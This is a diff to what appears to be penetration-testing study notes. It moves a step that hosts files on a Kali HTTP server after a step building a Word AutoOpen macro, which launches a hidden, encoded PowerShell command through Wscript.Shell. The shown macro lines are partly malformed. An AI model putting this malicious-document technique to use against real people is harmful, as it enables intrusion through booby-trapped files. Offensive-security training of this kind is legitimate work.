@@ -31,11 +31,7 @@ print("Str = \"powershell.exe -nop -w hidden -e \"")
 for i in range(0, len(payload), n):
     print("Str = Str + " + '"' + payload[i:i+n] + '"')
 ```
-start an http server:
-```
-kali$ python3 -m http.server 80
-```
-and embed it in Word macro:
+embed it in Word macro:
 ```
 Sub AutoOpen()
   MyMacro
@@ -53,6 +49,10 @@ Sub MyMacro()
   Str += Str + "string"
   CreateObject("Wscript.Shell").Run "Str"
 End Sub
+```
+and start an http server:
+```
+kali$ python3 -m http.server 80
 ```
 
 ### Library files
